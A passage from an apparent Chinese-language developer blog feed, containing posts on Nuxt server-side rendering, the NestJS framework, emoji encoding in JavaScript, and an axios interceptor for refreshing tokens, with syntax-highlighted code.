class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span>      data<span class="token punctuation">:</span> <span class="token punctuation">{</span> code<span class="token punctuation">,</span> data <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'https://loacalhost:3000'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">===</span> <span class="token string">'000'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'setConfig'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>Config<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如果，我想，设置初始化数据，然后再执行页面的<code>asyncData</code>方法，直接使用是不行的。需要在状态树中指定 <code>nuxtServerInit</code>方法。</p><p>页面首先执行<code>nuxtServerInit</code>方法，结束后触发<code>asyncData</code>或者页面<code>fetch</code>方法</p><p><img src="/images/render.jpg"></p><h4 id="6-插件机制"><a href="#6-插件机制" class="headerlink" title="6.插件机制"></a>6.插件机制</h4><p>一般的vue项目我们都是在<code>main.js</code>中引入插件使用。</p><p>在<code>next</code>项目中，需要在<code>plugins</code>文件夹下声明，并在<code>nuxt.config.js</code>中配置插件</p><h4 id="7-注意第三方包的引入方式"><a href="#7-注意第三方包的引入方式" class="headerlink" title="7.注意第三方包的引入方式"></a>7.注意第三方包的引入方式</h4><p>服务端是没有<code>window、document</code>的，如果第三方包含有这些，那么就会报错，需要指定这些包为浏览器渲染类型。</p><pre><code>let toolif (process.client) {  tool = require(&#39;name&#39;)}</code></pre><p>通过<code>commonjs</code>的方式引入，不能通过es6的方式引入。</p><h3 id="同构项目"><a href="#同构项目" class="headerlink" title="同构项目"></a>同构项目</h3><p>周末把公司的一个h5项目进行了同构。之前是 6s 出界面，然后是ajax请求，到可用差不多要7~8s。同构之后，初始请求全部放到服务端进行，1s出界面，2s dom渲染结束，页面可用。可以说，提升还是非常大的。</p><h3 id="大前端"><a href="#大前端" class="headerlink" title="大前端"></a>大前端</h3><p>使用了nuxt之后，前端真的不只是前端了，完全可以站在更高的角度去看待问题，能做到事情也更多了。api缓存，组件缓存，页面缓存，即使已经比较满意了，依然有很多可以优化的点。</p><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>node 作为中间层，可以做很多事情，大大拓展了前端的职业可能性。只要你愿意，可做的又岂止是一个中间层，可以把后端的事情也完全做完。</p><p>日志，监控，安全，涉及到的东西会越来越多。</p><p>同构，对体验无疑是有巨大帮助的，但是多出来的这么多运维成本，也是项目需要考虑的。</p><p>周末的<code>nuxt</code>体验就到此呐~</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuxt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nest 初体验</title>
      <link href="/2020/02/23/back-endback-end-nest-chu-ti-yan/"/>
      <url>/2020/02/23/back-endback-end-nest-chu-ti-yan/</url>
      
        <content type="html"><![CDATA[<p>假期中，学习了<code>nest</code>这个node后端框架。感觉整体比较简约，学习相对来说，比较容易。本篇，写一下自己对这个框架的理解。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>类angular的代码组织形式:<code>imports、module、service</code></li><li>基于<code>typescript</code>，面向未来，特别是基于装饰器的模式，代码变得非常简洁</li><li>底层基于<code>express</code>,支持更换为<code>fastify</code>平台，坐拥丰富的<code>express</code>中间件</li><li>拒绝刀耕火种，一直没有太深入的学习<code>koa</code>的一个重要原因。koa框架太简单，基本什么都做不了，都需要引入中间件，封装代码。<code>nest</code>对常用操作，做了丰富的封装，简单易上手。</li><li><code>node</code> 中的<code>spring</code>，<code>typescript</code>+<code>ioc</code>,值得学习~</li></ol><h3 id="入门安装"><a href="#入门安装" class="headerlink" title="入门安装"></a>入门安装</h3><ol><li><code>npm i -g @nestjs/cli</code></li><li><code>nest new project-name</code></li></ol><h3 id="文档理解"><a href="#文档理解" class="headerlink" title="文档理解"></a>文档理解</h3><p><a href="https://docs.nestjs.cn/6/firststeps" target="_blank" rel="noopener">官方文档</a> 写的还不错，看一遍，基本也能理解。不准备重复官方文档，针对文档的各个模块写一点自己的理解。</p><h4 id="控制器（controller）"><a href="#控制器（controller）" class="headerlink" title="控制器（controller）"></a>控制器（controller）</h4><p>可以看成是路由控制器，负责传入的请求和客户端的返回响应。</p><p>如果返回对象或者数组格式，会被自动包装成<code>JSON</code>格式。</p><h4 id="提供者（Providers）"><a href="#提供者（Providers）" class="headerlink" title="提供者（Providers）"></a>提供者（Providers）</h4><p>Provider只是一个用 <code>@Injectable()</code> 装饰器注释的类。通过Controller 的 <code>constructor</code>注入，并实例化。不需要手动实例化，也就是java中常说的依赖注入。</p><p>一般用来处理业务逻辑，数据库交互。</p><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>中间件是在路由处理程序 <strong>之前</strong> 调用的函数。本质上，就是路由之前的函数调用。</p><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><ul><li><strong>转换</strong>：管道将输入数据转换为所需的数据输出</li><li><strong>验证</strong>：对输入数据进行验证，如果验证成功继续传递; 验证失败则抛出异常;</li></ul><p>感觉<code>ValidationPipe</code> 用的会多一点，既可以用来做验证，也可以做转换。</p><h4 id="守卫"><a href="#守卫" class="headerlink" title="守卫"></a>守卫</h4><p>守卫是一个使用 <code>@Injectable()</code> 装饰器的类。 守卫应该实现 <code>CanActivate</code> 接口。</p><p>一般用来做鉴权，通过守卫函数，返回<code>True</code>或者<code>False</code>,实现鉴权。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>nest</code>现在每周20k的下载量，是koa的一半，但是他是一个面向未来的框架。基于typescript和类spring的架构，值得我投入时间去学习琢磨。</p><p>学习<code>nest</code>还有一个原因,假期尝试看了<code>java</code>的<code>spring boot</code>,概念实在是太繁杂了=-=，奴家实在是不会啊~</p><p>好啦，今年的个人项目后台就暂定为<code>nest</code>呐~</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端怎么样处理emoji表情</title>
      <link href="/2020/01/18/front-end/qian-duan-zen-me-yang-chu-li-emoji-biao-qing/"/>
      <url>/2020/01/18/front-end/qian-duan-zen-me-yang-chu-li-emoji-biao-qing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个 bug 的心路历程…</p><p>😀：新项目耶 ✌</p><p>🤔：怎么做是最佳实践呢</p><p>😁：终于好了</p><p>😎：测试通过，顺利上线</p><p>😱🥵😡：什么，线上 bug！</p></blockquote><p>一般而言，不推荐前端处理 emoji，最好的方式还是把数据库修改成 <code>utf8mb4</code>格式，但是，如果数据库不在你这里呢？如果是一个延续性项目呢…那前端可能没办法,就要自己去处理 emoji 了。</p><h3 id="emoji-是什么"><a href="#emoji-是什么" class="headerlink" title="emoji 是什么"></a>emoji 是什么</h3><p>emoji 是字符，不是图片。emoji 使用 Unicode 编码方式，可以方便的转换成其他格式。</p><p><a href="https://zh.wikipedia.org/wiki/%E7%B9%AA%E6%96%87%E5%AD%97" target="_blank" rel="noopener">维基百科关于 emoji 的介绍</a></p><p><a href="https://charbase.com/1f602-unicode-face-with-tears-of-joy" target="_blank" rel="noopener">charbase.com</a> ，网站提供了，各种格式 emoji 编码的查看方式：</p><p><img src="/images/image-20200118191909665.png" alt="笑哭"></p><p>上图可以方便的查看笑哭的 Unicode 编码：U+1F602，Javascript Escape：”\ud83d\ude02”等。</p><h3 id="常见-emoji-处理方式"><a href="#常见-emoji-处理方式" class="headerlink" title="常见 emoji 处理方式"></a>常见 emoji 处理方式</h3><ol><li>后台更改数据库格式为<code>utf8mb4</code>格式</li><li>使用文字替换，比如微信，QQ 等是使用<code>[笑哭]</code>格式表示 😂，</li><li>文字替换，但是不使用系统的 emoji，而是根据文字显示图片，实现多端显示统一</li><li>使用系统自带的 emoji 表情</li></ol><h3 id="emoji-常用转换函数"><a href="#emoji-常用转换函数" class="headerlink" title="emoji 常用转换函数"></a>emoji 常用转换函数</h3><p>转换函数，涉及到 unicode 的编码算法，属于专有领域知识，比较复杂，需要的时候复制就行了…不必深究。</p><p>方法一：转成Unicode</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// https://github.com/channg/umoji/blob/master/src/emojiToUnicode.js</span><span class="token comment" spellcheck="true">// 转换为js编码方式  😀=>"\ud83d\ude00"</span><span class="token keyword">function</span> <span class="token function">emojiToUnicode</span><span class="token punctuation">(</span>emoji<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> backStr <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>emoji <span class="token operator">&amp;&amp;</span> emoji<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> char <span class="token keyword">of</span> emoji<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> index <span class="token operator">=</span> char<span class="token punctuation">.</span><span class="token function">codePointAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">></span> <span class="token number">65535</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> h <span class="token operator">=</span>          <span class="token string">"\\u"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xd800</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> c <span class="token operator">=</span> <span class="token string">"\\u"</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">-</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xdc00</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        backStr <span class="token operator">=</span> backStr <span class="token operator">+</span> h <span class="token operator">+</span> c<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        backStr <span class="token operator">=</span> backStr <span class="token operator">+</span> char<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>backStr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> backStr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>方法二：转成HTML实体编码</p><p><strong>不推荐！！！</strong></p><p>如果显示HTML编码，那么在<code>vue</code>框架中必须使用<code>v-html</code>,这是非常危险的，很容易导致<code>xss</code>攻击！</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// https://jordonwang.github.io/2018/06/06/emoji-string/</span><span class="token comment" spellcheck="true">// 转换为HTML实体字符</span><span class="token keyword">function</span> <span class="token function">emojiToHTMLEscape</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> patt <span class="token operator">=</span> <span class="token regex">/[\ud800-\udbff][\udc00-\udfff]/g</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 检测utf16字符正则</span>  str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>patt<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> H<span class="token punctuation">,</span> L<span class="token punctuation">,</span> code<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>char<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      H <span class="token operator">=</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 取出高位</span>      L <span class="token operator">=</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 取出低位</span>      code <span class="token operator">=</span> <span class="token punctuation">(</span>H <span class="token operator">-</span> <span class="token number">0xd800</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x400</span> <span class="token operator">+</span> <span class="token number">0x10000</span> <span class="token operator">+</span> L <span class="token operator">-</span> <span class="token number">0xdc00</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 转换算法</span>      <span class="token keyword">return</span> <span class="token string">"&amp;#"</span> <span class="token operator">+</span> code <span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> char<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果想深入研究，可以参考：</p><p><a href="https://blog.csdn.net/binjly/article/details/47321043" target="_blank" rel="noopener">移动前端手机输入法自带 emoji 表情字符处理</a></p><p><a href="http://www.ruanyifeng.com/blog/2014/12/unicode.html" target="_blank" rel="noopener">Unicode 与 JavaScript 详解</a></p><h3 id="bug-场景及解决办法"><a href="#bug-场景及解决办法" class="headerlink" title="bug 场景及解决办法"></a>bug 场景及解决办法</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 数据来自服务端,我传递时候做JSON编码，\被转义为\\</span><span class="token keyword">let</span> serverValue <span class="token operator">=</span> <span class="token string">"\\ud83d\\ude00\\ud83d\\ude00"</span><span class="token punctuation">;</span><span class="token keyword">let</span> value <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>serverValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">{</span>value<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span></code></pre><p>看起来是一切正常，没有问题。我传递给后端的数据，做<code>JSON.Stringfy(value)</code>编码，拿到时候，再对字符串做 <code>JSON.parse(value)</code>解码。</p><p>但是，线上报错。仔细研究发现，有些数据，并不是我传递给后端的，而这些数据里面含有 JSON 的非法字符，导致 JSON 报错。</p><p>解决方式也简单：</p><ol><li>不使用 JSON.parse 解码，直接替换\\为\,就可以直接显示在页面上</li><li>如果使用 JSON.parse 解码，加个 try catch</li></ol><p>似乎问题解决了，但是JS似乎并不能很好的处理\\为\，<a href="https://stackoverflow.com/questions/33685680/emoji-surrogate-string-with-javascript-how-to-parse" target="_blank" rel="noopener">stackoverflow</a>这个方法正则方法可以：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">parseUnicode</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token regex">/\\u([\d\w]{4})/gi</span><span class="token punctuation">;</span>    str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>match<span class="token punctuation">,</span> grp<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>grp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在线测试：</p><iframe scrolling="no" width="100%" height="500" src="https://jsfiddle.net/wukong/6e1fjz4w/23/embedded/js,html,result/dark" frameborder="0" loading="lazy" allowfullscreen></iframe><h3 id="JSON-对字符串的处理"><a href="#JSON-对字符串的处理" class="headerlink" title="JSON 对字符串的处理"></a>JSON 对字符串的处理</h3><p>前端使用 json，基本都是对 object 进行编码，解码，很少对字符串进行编码解码。如果 JSON.parse()遇到’&#39;，往往会报错，基本上都需要转义为‘’\\‘</p><p>自己对<code>JSON</code>规范并不熟悉，关于<code>JSON</code>以后单独再写一篇。</p><p><img src="/images/image-20200118203439540.png" alt="JSON 转义测试"></p><img src="/images/json.png" alt="轨道图" style="zoom: 33%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>问题最终定位在 JSON 的转义上面，虽然天天在用 JSON，但是并不理解，查了很多资料，还是一星半解，这篇博客是很难写好了…</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> emoji </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从Axios源码学习Promise的妙用</title>
      <link href="/2020/01/05/front-end/cong-axios-yuan-ma-xue-xi-promise-de-miao-yong/"/>
      <url>/2020/01/05/front-end/cong-axios-yuan-ma-xue-xi-promise-de-miao-yong/</url>
      
        <content type="html"><![CDATA[<p>惭愧，虽然一直在使用<code>Promise/async/await</code>，但是自己其实对<code>Promise</code>并不是特别理解，导致这次遇到问题时候，一直不是特别明白。</p><hr><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><blockquote><p>需求：前端定时刷新 token 接口</p></blockquote><p>分析：看起来不复杂，但是如果考虑到 token 有时间限制，超时不可用，同时发起多个请求，怎么样在更新 token 的时候，延迟其他请求的发送，这就有点复杂了。</p><p>接口我是用 axios 去请求，这部分功能应该都会在拦截其中实现。我遇到的难点，也就是如何 hold 住请求，等待 token 刷新，释放请求。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">"axios"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 从localStorage中获取token，token存的是object信息，有tokenExpireTime和token两个字段</span><span class="token keyword">function</span> <span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> tokenObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    tokenObj <span class="token operator">=</span> storage<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    tokenObj <span class="token operator">=</span> tokenObj <span class="token operator">?</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>tokenObj<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"get token from localStorage error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> tokenObj<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">refreshToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// instance是当前request.js中已创建的axios实例</span>  <span class="token keyword">return</span> instance<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/refreshtoken"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> res<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 给实例添加一个setToken方法，用于登录后方便将最新token动态添加到header，同时将token保存在localStorage中</span>instance<span class="token punctuation">.</span>setToken <span class="token operator">=</span> obj <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  instance<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Token"</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">.</span>token<span class="token punctuation">;</span>  window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 注意这里需要变成字符串后才能放到localStorage中</span><span class="token punctuation">}</span><span class="token punctuation">;</span>instance<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>  config <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> tokenObj <span class="token operator">=</span> <span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 添加请求头</span>    config<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Token"</span><span class="token punctuation">]</span> <span class="token operator">=</span> tokenObj<span class="token punctuation">.</span>token<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 登录接口和刷新token接口绕过</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>      config<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"/rereshToken"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span>      config<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> config<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tokenObj<span class="token punctuation">.</span>token <span class="token operator">&amp;&amp;</span> tokenObj<span class="token punctuation">.</span>tokenExpireTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">>=</span> tokenObj<span class="token punctuation">.</span>tokenExpireTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 立即刷新token</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isRefreshing<span class="token punctuation">)</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"刷新token ing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          isRefreshing <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>          <span class="token function">refreshToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              <span class="token keyword">const</span> <span class="token punctuation">{</span> token<span class="token punctuation">,</span> tokenExprieIn <span class="token punctuation">}</span> <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">;</span>              <span class="token keyword">const</span> tokenExpireTime <span class="token operator">=</span> now <span class="token operator">+</span> tokenExprieIn <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>              instance<span class="token punctuation">.</span><span class="token function">setToken</span><span class="token punctuation">(</span><span class="token punctuation">{</span> token<span class="token punctuation">,</span> tokenExpireTime <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              isRefreshing <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> token<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>token <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"刷新token成功，执行队列"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              requests<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>cb <span class="token operator">=</span><span class="token operator">></span> <span class="token function">cb</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 执行完成后，清空队列</span>              requests <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"refresh token error: "</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> retryOriginalRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          requests<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>token <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 因为config中的token是旧的，所以刷新token后要将新token传进来</span>            config<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"X-Token"</span><span class="token punctuation">]</span> <span class="token operator">=</span> token<span class="token punctuation">;</span>            <span class="token function">resolve</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> retryOriginalRequest<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> config<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Do something with request error</span>    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 请求返回后拦截</span>instance<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>  response <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>data<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">===</span> <span class="token number">1234</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// token过期了，直接跳转到登录页</span>      window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> response<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"catch"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 